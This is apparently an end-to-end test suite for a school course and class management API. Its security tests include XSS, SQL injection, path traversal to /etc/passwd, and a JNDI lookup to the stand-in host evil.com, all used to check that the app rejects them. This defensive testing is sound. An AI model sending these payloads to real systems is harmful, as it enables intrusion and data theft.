import { Test, TestingModule } from '@nestjs/testing';
import { INestApplication, ValidationPipe } from '@nestjs/common';
import request from 'supertest';
import { AppModule } from '../src/app.module';
import { PrismaService } from '../src/prisma/prisma.service';

// Set test environment variables
process.env.JWT_SECRET = 'test-jwt-secret-minimum-32-characters-long-12345';
process.env.JWT_REFRESH_SECRET = 'test-refresh-secret-32-characters-long-67890';
process.env.NODE_ENV = 'test';
process.env.REDIS_URL = 'redis://localhost:6379';

describe('CoursesController & ClassesController (e2e)', () => {
    let app: INestApplication;
    let prisma: PrismaService;

    // Test data
    let adminToken: string;
    let teacherToken: string;
    let parentToken: string;
    let studentToken: string;
    let adminId: string;
    let teacherId: string;
    let studentId: string;
    let courseId: string;
    let classId: string;

    beforeAll(async () => {
        const moduleFixture: TestingModule = await Test.createTestingModule({
            imports: [AppModule],
        }).compile();

        app = moduleFixture.createNestApplication();
        app.useGlobalPipes(new ValidationPipe({ whitelist: true, transform: true }));
        await app.init();

        prisma = moduleFixture.get<PrismaService>(PrismaService);
    });

    afterAll(async () => {
        await app.close();
    });

    beforeEach(async () => {
        // Clean up test data in correct order
        await prisma.schedule.deleteMany({});
        await prisma.classEnrollment.deleteMany({});
        await prisma.classTeacher.deleteMany({});
        await prisma.class.deleteMany({});
        await prisma.course.deleteMany({});
        await prisma.parentStudent.deleteMany({});
        await prisma.userRole.deleteMany({});
        await prisma.refreshToken.deleteMany({});
        await prisma.user.deleteMany({
            where: { email: { contains: 'test@' } },
        });

        // Create test users
        const adminResponse = await request(app.getHttpServer())
            .post('/api/auth/register')
            .send({
                email: 'test@admin.school.com',
                password: 'Password123!',
                firstName: 'Admin',
                lastName: 'User',
                role: 'admin',
            });
        adminToken = adminResponse.body.accessToken;
        adminId = adminResponse.body.user.id;

        const teacherResponse = await request(app.getHttpServer())
            .post('/api/auth/register')
            .send({
                email: 'test@teacher.school.com',
                password: 'Password123!',
                firstName: 'Teacher',
                lastName: 'User',
                role: 'teacher',
            });
        teacherToken = teacherResponse.body.accessToken;
        teacherId = teacherResponse.body.user.id;

        const parentResponse = await request(app.getHttpServer())
            .post('/api/auth/register')
            .send({
                email: 'test@parent.school.com',
                password: 'Password123!',
                firstName: 'Parent',
                lastName: 'User',
                role: 'parent',
            });
        parentToken = parentResponse.body.accessToken;

        const studentResponse = await request(app.getHttpServer())
            .post('/api/auth/register')
            .send({
                email: 'test@student.school.com',
                password: 'Password123!',
                firstName: 'Student',
                lastName: 'User',
                role: 'student',
            });
        studentToken = studentResponse.body.accessToken;
        studentId = studentResponse.body.user.id;

        // Create a test course
        const courseResponse = await request(app.getHttpServer())
            .post('/api/courses')
            .set('Authorization', `Bearer ${adminToken}`)
            .send({
                code: 'TEST101',
                name: 'Test Course',
                description: 'A test course for E2E testing',
                credits: 3,
                department: 'Testing',
            });
        courseId = courseResponse.body.id;

        // Create a test class
        const classResponse = await request(app.getHttpServer())
            .post('/api/classes')
            .set('Authorization', `Bearer ${adminToken}`)
            .send({
                courseId: courseId,
                teacherId: teacherId,
                term: 'Fall 2025',
                section: 'A',
                room: 'Room 101',
                maxStudents: 30,
            });
        classId = classResponse.body.id;
    });

    // ===============================================================================
    // AUTHENTICATION TESTS
    // ===============================================================================
    describe('Authentication', () => {
        it('should return 401 when no token provided for courses', async () => {
            await request(app.getHttpServer())
                .get('/api/courses')
                .expect(401);
        });

        it('should return 401 when no token provided for classes', async () => {
            await request(app.getHttpServer())
                .get('/api/classes')
                .expect(401);
        });

        it('should return 401 for course creation without token', async () => {
            await request(app.getHttpServer())
                .post('/api/courses')
                .send({ code: 'HACK101', name: 'Hacked Course' })
                .expect(401);
        });

        it('should return 401 with expired token', async () => {
            const expiredToken = adminToken.slice(0, -10) + '0000000000';
            await request(app.getHttpServer())
                .get('/api/courses')
                .set('Authorization', `Bearer ${expiredToken}`)
                .expect(401);
        });
    });

    // ===============================================================================
    // ROLE-BASED ACCESS TESTS
    // ===============================================================================
    describe('Role-Based Access Control', () => {
        describe('Courses - Admin Only Operations', () => {
            it('should allow admin to create courses', async () => {
                await request(app.getHttpServer())
                    .post('/api/courses')
                    .set('Authorization', `Bearer ${adminToken}`)
                    .send({
                        code: 'ADMIN101',
                        name: 'Admin Course',
                    })
                    .expect(201);
            });

            it('should allow teacher to create courses', async () => {
                await request(app.getHttpServer())
                    .post('/api/courses')
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({
                        code: 'TEACH101',
                        name: 'Teacher Course',
                    })
                    .expect(201);
            });

            it('should block parent from creating courses', async () => {
                await request(app.getHttpServer())
                    .post('/api/courses')
                    .set('Authorization', `Bearer ${parentToken}`)
                    .send({
                        code: 'PARENT101',
                        name: 'Parent Course',
                    })
                    .expect(403);
            });

            it('should block student from creating courses', async () => {
                await request(app.getHttpServer())
                    .post('/api/courses')
                    .set('Authorization', `Bearer ${studentToken}`)
                    .send({
                        code: 'STUD101',
                        name: 'Student Course',
                    })
                    .expect(403);
            });

            it('should allow admin to update course', async () => {
                await request(app.getHttpServer())
                    .put(`/api/courses/${courseId}`)
                    .set('Authorization', `Bearer ${adminToken}`)
                    .send({ name: 'Updated Course Name' })
                    .expect(200);
            });

            it('should block teacher from updating course (admin only)', async () => {
                await request(app.getHttpServer())
                    .put(`/api/courses/${courseId}`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({ name: 'Hacked Course Name' })
                    .expect(403);
            });

            it('should allow admin to delete course', async () => {
                await request(app.getHttpServer())
                    .delete(`/api/courses/${courseId}`)
                    .set('Authorization', `Bearer ${adminToken}`)
                    .expect(200);
            });

            it('should block teacher from deleting course', async () => {
                await request(app.getHttpServer())
                    .delete(`/api/courses/${courseId}`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .expect(403);
            });
        });

        describe('Classes - Admin/Teacher Operations', () => {
            it('should allow admin to create classes', async () => {
                await request(app.getHttpServer())
                    .post('/api/classes')
                    .set('Authorization', `Bearer ${adminToken}`)
                    .send({
                        courseId: courseId,
                        teacherId: teacherId,
                        term: 'Spring 2025',
                    })
                    .expect(201);
            });

            it('should allow teacher to create classes', async () => {
                await request(app.getHttpServer())
                    .post('/api/classes')
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({
                        courseId: courseId,
                        teacherId: teacherId,
                        term: 'Spring 2025',
                    })
                    .expect(201);
            });

            it('should block parent from creating classes', async () => {
                await request(app.getHttpServer())
                    .post('/api/classes')
                    .set('Authorization', `Bearer ${parentToken}`)
                    .send({
                        courseId: courseId,
                        teacherId: teacherId,
                        term: 'Spring 2025',
                    })
                    .expect(403);
            });

            it('should allow admin to delete class', async () => {
                await request(app.getHttpServer())
                    .delete(`/api/classes/${classId}`)
                    .set('Authorization', `Bearer ${adminToken}`)
                    .expect(200);
            });

            it('should block teacher from deleting class', async () => {
                await request(app.getHttpServer())
                    .delete(`/api/classes/${classId}`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .expect(403);
            });
        });

        describe('Admin Summary Endpoint', () => {
            it('should allow admin to access classes summary', async () => {
                const response = await request(app.getHttpServer())
                    .get('/api/classes/admin/summary')
                    .set('Authorization', `Bearer ${adminToken}`)
                    .expect(200);

                expect(response.body).toBeDefined();
            });

            it('should block teacher from admin summary', async () => {
                await request(app.getHttpServer())
                    .get('/api/classes/admin/summary')
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .expect(403);
            });
        });
    });

    // ===============================================================================
    // COURSES CRUD TESTS
    // ===============================================================================
    describe('Courses CRUD Operations', () => {
        describe('GET /api/courses', () => {
            it('should return 200 with list of courses', async () => {
                const response = await request(app.getHttpServer())
                    .get('/api/courses')
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(200);

                expect(response.body.data).toBeDefined();
                expect(Array.isArray(response.body.data)).toBe(true);
            });

            it('should support pagination', async () => {
                const response = await request(app.getHttpServer())
                    .get('/api/courses?page=1&limit=5')
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(200);

                expect(response.body.meta).toBeDefined();
                expect(response.body.meta.page).toBe(1);
            });

            it('should filter by department', async () => {
                const response = await request(app.getHttpServer())
                    .get('/api/courses?department=Testing')
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(200);

                expect(response.body.data).toBeDefined();
            });

            it('should filter by active status', async () => {
                const response = await request(app.getHttpServer())
                    .get('/api/courses?active=true')
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(200);

                expect(response.body.data).toBeDefined();
            });

            it('should search courses', async () => {
                const response = await request(app.getHttpServer())
                    .get('/api/courses?search=Test')
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(200);

                expect(response.body.data).toBeDefined();
            });

            it('should return empty list when no courses match', async () => {
                const response = await request(app.getHttpServer())
                    .get('/api/courses?search=NonExistentCourseXYZ')
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(200);

                expect(response.body.data).toEqual([]);
            });
        });

        describe('GET /api/courses/:id', () => {
            it('should return 200 with course details', async () => {
                const response = await request(app.getHttpServer())
                    .get(`/api/courses/${courseId}`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(200);

                expect(response.body.id).toBe(courseId);
                expect(response.body.code).toBe('TEST101');
            });

            it('should return 404 for non-existent course', async () => {
                const nonExistentUuid = '12345678-1234-1234-1234-123456789abc';
                await request(app.getHttpServer())
                    .get(`/api/courses/${nonExistentUuid}`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(404);
            });

            it('should return 400 for invalid UUID format', async () => {
                await request(app.getHttpServer())
                    .get('/api/courses/invalid-uuid')
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(400);
            });
        });

        describe('POST /api/courses', () => {
            it('should return 201 when creating valid course', async () => {
                const response = await request(app.getHttpServer())
                    .post('/api/courses')
                    .set('Authorization', `Bearer ${adminToken}`)
                    .send({
                        code: 'NEW101',
                        name: 'New Test Course',
                        description: 'Description here',
                        credits: 4,
                        department: 'Science',
                    })
                    .expect(201);

                expect(response.body.id).toBeDefined();
                expect(response.body.code).toBe('NEW101');
            });

            it('should return 400 for missing required fields', async () => {
                await request(app.getHttpServer())
                    .post('/api/courses')
                    .set('Authorization', `Bearer ${adminToken}`)
                    .send({ code: 'ONLYCODE' })
                    .expect(400);
            });

            it('should return 400 for validation errors', async () => {
                await request(app.getHttpServer())
                    .post('/api/courses')
                    .set('Authorization', `Bearer ${adminToken}`)
                    .send({
                        code: 'X',
                        name: '',
                        credits: 100, // Exceeds max
                    })
                    .expect(400);
            });

            it('should return 409 for duplicate course code', async () => {
                // Create first course
                await request(app.getHttpServer())
                    .post('/api/courses')
                    .set('Authorization', `Bearer ${adminToken}`)
                    .send({
                        code: 'DUPLICATE101',
                        name: 'First Course',
                    });

                // Try to create duplicate
                await request(app.getHttpServer())
                    .post('/api/courses')
                    .set('Authorization', `Bearer ${adminToken}`)
                    .send({
                        code: 'DUPLICATE101',
                        name: 'Second Course',
                    })
                    .expect(409);
            });
        });

        describe('PUT /api/courses/:id', () => {
            it('should return 200 when updating course', async () => {
                const response = await request(app.getHttpServer())
                    .put(`/api/courses/${courseId}`)
                    .set('Authorization', `Bearer ${adminToken}`)
                    .send({
                        name: 'Updated Course Name',
                        credits: 5,
                    })
                    .expect(200);

                expect(response.body.name).toBe('Updated Course Name');
            });

            it('should return 404 for non-existent course', async () => {
                const nonExistentUuid = '12345678-1234-1234-1234-123456789abc';
                await request(app.getHttpServer())
                    .put(`/api/courses/${nonExistentUuid}`)
                    .set('Authorization', `Bearer ${adminToken}`)
                    .send({ name: 'Updated Name' })
                    .expect(404);
            });

            it('should return 400 for invalid update data', async () => {
                await request(app.getHttpServer())
                    .put(`/api/courses/${courseId}`)
                    .set('Authorization', `Bearer ${adminToken}`)
                    .send({
                        credits: 'invalid_number',
                    })
                    .expect(400);
            });
        });

        describe('DELETE /api/courses/:id', () => {
            it('should return 200 when deleting course', async () => {
                await request(app.getHttpServer())
                    .delete(`/api/courses/${courseId}`)
                    .set('Authorization', `Bearer ${adminToken}`)
                    .expect(200);
            });

            it('should return 404 for non-existent course', async () => {
                const nonExistentUuid = '12345678-1234-1234-1234-123456789abc';
                await request(app.getHttpServer())
                    .delete(`/api/courses/${nonExistentUuid}`)
                    .set('Authorization', `Bearer ${adminToken}`)
                    .expect(404);
            });
        });
    });

    // ===============================================================================
    // CLASSES CRUD TESTS
    // ===============================================================================
    describe('Classes CRUD Operations', () => {
        describe('GET /api/classes', () => {
            it('should return 200 with list of classes', async () => {
                const response = await request(app.getHttpServer())
                    .get('/api/classes')
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(200);

                expect(response.body.data).toBeDefined();
                expect(Array.isArray(response.body.data)).toBe(true);
            });

            it('should filter by term', async () => {
                const response = await request(app.getHttpServer())
                    .get('/api/classes?term=Fall%202025')
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(200);

                expect(response.body.data).toBeDefined();
            });

            it('should filter by teacherId', async () => {
                const response = await request(app.getHttpServer())
                    .get(`/api/classes?teacherId=${teacherId}`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(200);

                expect(response.body.data).toBeDefined();
            });

            it('should filter by courseId', async () => {
                const response = await request(app.getHttpServer())
                    .get(`/api/classes?courseId=${courseId}`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(200);

                expect(response.body.data).toBeDefined();
            });
        });

        describe('GET /api/classes/:id', () => {
            it('should return 200 with class details', async () => {
                const response = await request(app.getHttpServer())
                    .get(`/api/classes/${classId}`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(200);

                expect(response.body.id).toBe(classId);
            });

            it('should return 404 for non-existent class', async () => {
                const nonExistentUuid = '12345678-1234-1234-1234-123456789abc';
                await request(app.getHttpServer())
                    .get(`/api/classes/${nonExistentUuid}`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(404);
            });
        });

        describe('GET /api/classes/my', () => {
            it('should return teacher classes for teacher', async () => {
                const response = await request(app.getHttpServer())
                    .get('/api/classes/my')
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .expect(200);

                expect(response.body).toBeDefined();
            });

            it('should return student classes for student', async () => {
                const response = await request(app.getHttpServer())
                    .get('/api/classes/my')
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(200);

                expect(response.body).toBeDefined();
            });
        });

        describe('POST /api/classes', () => {
            it('should return 201 when creating valid class', async () => {
                const response = await request(app.getHttpServer())
                    .post('/api/classes')
                    .set('Authorization', `Bearer ${adminToken}`)
                    .send({
                        courseId: courseId,
                        teacherId: teacherId,
                        term: 'Winter 2025',
                        section: 'B',
                        room: 'Room 202',
                        maxStudents: 25,
                    })
                    .expect(201);

                expect(response.body.id).toBeDefined();
            });

            it('should return 400 for missing required fields', async () => {
                await request(app.getHttpServer())
                    .post('/api/classes')
                    .set('Authorization', `Bearer ${adminToken}`)
                    .send({ term: 'Fall 2025' })
                    .expect(400);
            });

            it('should return 400 for invalid UUID references', async () => {
                await request(app.getHttpServer())
                    .post('/api/classes')
                    .set('Authorization', `Bearer ${adminToken}`)
                    .send({
                        courseId: 'invalid-uuid',
                        teacherId: teacherId,
                        term: 'Fall 2025',
                    })
                    .expect(400);
            });
        });

        describe('PUT /api/classes/:id', () => {
            it('should return 200 when updating class', async () => {
                const response = await request(app.getHttpServer())
                    .put(`/api/classes/${classId}`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({
                        room: 'Updated Room 303',
                        maxStudents: 35,
                    })
                    .expect(200);

                expect(response.body.room).toBe('Updated Room 303');
            });
        });
    });

    // ===============================================================================
    // ENROLLMENT TESTS
    // ===============================================================================
    describe('Class Enrollment', () => {
        it('should allow admin to enroll student', async () => {
            const response = await request(app.getHttpServer())
                .post(`/api/classes/${classId}/enroll`)
                .set('Authorization', `Bearer ${adminToken}`)
                .send({ studentId: studentId })
                .expect(201);

            expect(response.body).toBeDefined();
        });

        it('should allow teacher to enroll student', async () => {
            await request(app.getHttpServer())
                .post(`/api/classes/${classId}/enroll`)
                .set('Authorization', `Bearer ${teacherToken}`)
                .send({ studentId: studentId })
                .expect(201);
        });

        it('should block parent from enrolling student', async () => {
            await request(app.getHttpServer())
                .post(`/api/classes/${classId}/enroll`)
                .set('Authorization', `Bearer ${parentToken}`)
                .send({ studentId: studentId })
                .expect(403);
        });

        it('should block student from self-enrolling', async () => {
            await request(app.getHttpServer())
                .post(`/api/classes/${classId}/enroll`)
                .set('Authorization', `Bearer ${studentToken}`)
                .send({ studentId: studentId })
                .expect(403);
        });

        it('should handle bulk enrollment', async () => {
            const response = await request(app.getHttpServer())
                .post(`/api/classes/${classId}/enroll/bulk`)
                .set('Authorization', `Bearer ${adminToken}`)
                .send({ studentIds: [studentId] })
                .expect(201);

            expect(response.body).toBeDefined();
        });

        it('should limit bulk enrollment to 100 students', async () => {
            const manyStudentIds = Array(101).fill(studentId);
            await request(app.getHttpServer())
                .post(`/api/classes/${classId}/enroll/bulk`)
                .set('Authorization', `Bearer ${adminToken}`)
                .send({ studentIds: manyStudentIds })
                .expect(400);
        });

        it('should allow admin to drop student', async () => {
            // First enroll
            await request(app.getHttpServer())
                .post(`/api/classes/${classId}/enroll`)
                .set('Authorization', `Bearer ${adminToken}`)
                .send({ studentId: studentId });

            // Then drop
            await request(app.getHttpServer())
                .delete(`/api/classes/${classId}/students/${studentId}`)
                .set('Authorization', `Bearer ${adminToken}`)
                .expect(200);
        });

        it('should return class roster', async () => {
            const response = await request(app.getHttpServer())
                .get(`/api/classes/${classId}/roster`)
                .set('Authorization', `Bearer ${teacherToken}`)
                .expect(200);

            expect(response.body.data).toBeDefined();
        });
    });

    // ===============================================================================
    // SCHEDULE TESTS
    // ===============================================================================
    describe('Class Schedules', () => {
        it('should allow admin to add schedules', async () => {
            const response = await request(app.getHttpServer())
                .post(`/api/classes/${classId}/schedules`)
                .set('Authorization', `Bearer ${adminToken}`)
                .send({
                    schedules: [
                        { dayOfWeek: 1, startTime: '09:00', endTime: '10:30' },
                        { dayOfWeek: 3, startTime: '09:00', endTime: '10:30' },
                    ],
                })
                .expect(201);

            expect(response.body).toBeDefined();
        });

        it('should limit schedules to 7 per request', async () => {
            const manySchedules = Array(8).fill({
                dayOfWeek: 1,
                startTime: '09:00',
                endTime: '10:00',
            });

            await request(app.getHttpServer())
                .post(`/api/classes/${classId}/schedules`)
                .set('Authorization', `Bearer ${adminToken}`)
                .send({ schedules: manySchedules })
                .expect(400);
        });

        it('should validate dayOfWeek range', async () => {
            await request(app.getHttpServer())
                .post(`/api/classes/${classId}/schedules`)
                .set('Authorization', `Bearer ${adminToken}`)
                .send({
                    schedules: [
                        { dayOfWeek: 10, startTime: '09:00', endTime: '10:30' },
                    ],
                })
                .expect(400);
        });

        it('should return class schedules', async () => {
            const response = await request(app.getHttpServer())
                .get(`/api/classes/${classId}/schedules`)
                .set('Authorization', `Bearer ${studentToken}`)
                .expect(200);

            expect(response.body).toBeDefined();
        });
    });

    // ===============================================================================
    // SECURITY TESTS
    // ===============================================================================
    describe('Security Tests', () => {
        it('should sanitize XSS in course description', async () => {
            const xssPayload = '<script>alert("xss")</script>';

            await request(app.getHttpServer())
                .post('/api/courses')
                .set('Authorization', `Bearer ${adminToken}`)
                .send({
                    code: 'XSS101',
                    name: 'XSS Test',
                    description: xssPayload,
                })
                .expect(201);

            // The payload should be sanitized
        });

        it('should prevent SQL injection in search parameter', async () => {
            await request(app.getHttpServer())
                .get('/api/courses?search=\'; DROP TABLE courses; --')
                .set('Authorization', `Bearer ${studentToken}`)
                .expect(200);

            // Verify courses still exist
            const response = await request(app.getHttpServer())
                .get('/api/courses')
                .set('Authorization', `Bearer ${studentToken}`)
                .expect(200);

            expect(response.body.data.length).toBeGreaterThan(0);
        });

        it('should reject oversized payloads', async () => {
            const hugeDescription = 'a'.repeat(10000);

            await request(app.getHttpServer())
                .post('/api/courses')
                .set('Authorization', `Bearer ${adminToken}`)
                .send({
                    code: 'HUGE101',
                    name: 'Huge Course',
                    description: hugeDescription,
                })
                .expect(400);
        });

        it('should validate UUID format strictly', async () => {
            const injectionAttempts = [
                "' OR '1'='1",
                "../../../etc/passwd",
                "${jndi:ldap://evil.com}",
                "<img src=x onerror=alert(1)>",
            ];

            for (const attempt of injectionAttempts) {
                await request(app.getHttpServer())
                    .get(`/api/courses/${encodeURIComponent(attempt)}`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(400);
            }
        });
    });

    // ===============================================================================
    // EDGE CASES
    // ===============================================================================
    describe('Edge Cases', () => {
        it('should handle concurrent enrollment requests', async () => {
            const promises = Array(5).fill(0).map(() =>
                request(app.getHttpServer())
                    .post(`/api/classes/${classId}/enroll`)
                    .set('Authorization', `Bearer ${adminToken}`)
                    .send({ studentId: studentId })
            );

            const responses = await Promise.all(promises);

            // Should handle gracefully (some may succeed, some may fail with conflict)
            responses.forEach(response => {
                expect([201, 409, 400]).toContain(response.status);
            });
        });

        it('should enforce max students limit', async () => {
            // Create a class with max 1 student
            const smallClass = await request(app.getHttpServer())
                .post('/api/classes')
                .set('Authorization', `Bearer ${adminToken}`)
                .send({
                    courseId: courseId,
                    teacherId: teacherId,
                    term: 'Summer 2025',
                    maxStudents: 1,
                });

            // Enroll first student
            await request(app.getHttpServer())
                .post(`/api/classes/${smallClass.body.id}/enroll`)
                .set('Authorization', `Bearer ${adminToken}`)
                .send({ studentId: studentId });

            // Create another student
            const anotherStudent = await request(app.getHttpServer())
                .post('/api/auth/register')
                .send({
                    email: 'test@student2.school.com',
                    password: 'Password123!',
                    firstName: 'Another',
                    lastName: 'Student',
                    role: 'student',
                });

            // Try to enroll second student (should fail or be queued)
            const response = await request(app.getHttpServer())
                .post(`/api/classes/${smallClass.body.id}/enroll`)
                .set('Authorization', `Bearer ${adminToken}`)
                .send({ studentId: anotherStudent.body.user.id });

            // Expect either 201 (waitlist) or 409 (full)
            expect([201, 409]).toContain(response.status);
        });

        it('should handle cascade delete of course with classes', async () => {
            // Create course with class
            const courseWithClass = await request(app.getHttpServer())
                .post('/api/courses')
                .set('Authorization', `Bearer ${adminToken}`)
                .send({
                    code: 'DELETE101',
                    name: 'Delete Test Course',
                });

            await request(app.getHttpServer())
                .post('/api/classes')
                .set('Authorization', `Bearer ${adminToken}`)
                .send({
                    courseId: courseWithClass.body.id,
                    teacherId: teacherId,
                    term: 'Fall 2025',
                });

            // Delete course (should soft delete classes too)
            await request(app.getHttpServer())
                .delete(`/api/courses/${courseWithClass.body.id}`)
                .set('Authorization', `Bearer ${adminToken}`)
                .expect(200);
        });

        it('should handle soft delete behavior', async () => {
            // Soft delete class
            await prisma.class.update({
                where: { id: classId },
                data: { deletedAt: new Date() },
            });

            // Should not appear in list
            const response = await request(app.getHttpServer())
                .get('/api/classes')
                .set('Authorization', `Bearer ${studentToken}`)
                .expect(200);

            const deletedClass = response.body.data.find(
                (c: any) => c.id === classId
            );
            expect(deletedClass).toBeUndefined();
        });

        it('should handle invalid time formats in schedules', async () => {
            await request(app.getHttpServer())
                .post(`/api/classes/${classId}/schedules`)
                .set('Authorization', `Bearer ${adminToken}`)
                .send({
                    schedules: [
                        { dayOfWeek: 1, startTime: '25:00', endTime: '26:30' },
                    ],
                })
                .expect(400);
        });

        it('should handle empty arrays gracefully', async () => {
            await request(app.getHttpServer())
                .post(`/api/classes/${classId}/enroll/bulk`)
                .set('Authorization', `Bearer ${adminToken}`)
                .send({ studentIds: [] })
                .expect(201);
        });
    });
});
